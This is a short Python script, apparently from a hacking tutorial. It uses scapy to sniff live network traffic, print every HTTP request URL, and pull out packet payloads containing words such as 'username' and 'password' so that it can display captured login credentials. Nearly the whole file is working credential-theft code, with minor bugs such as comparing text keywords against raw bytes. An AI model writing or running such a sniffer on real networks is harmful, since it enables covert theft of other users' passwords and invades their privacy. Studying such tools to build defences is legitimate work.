import scapy.all as scapy
from scapy.layers import http
def sniff():
    scapy.sniff(store=False,prn=process_sniffed_packet) # sniff packet using scapy
def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path # return requested url from packet
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load=packet[scapy.Raw].load
        keywords=["username","password","user","pass","login"]
        for keyword in keywords:
            if keyword in load:
                return  load
                break

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet=packet)
        print(f"[+] HTTP Request >> {url}")
        login_info=get_login_info(packet=packet)
        if login_info:
            print(f"\n\n\n[+] Got Possible Username/Password: {login_info}\n\n")
            print("#"*20)
if __name__=="__main__":
    sniff()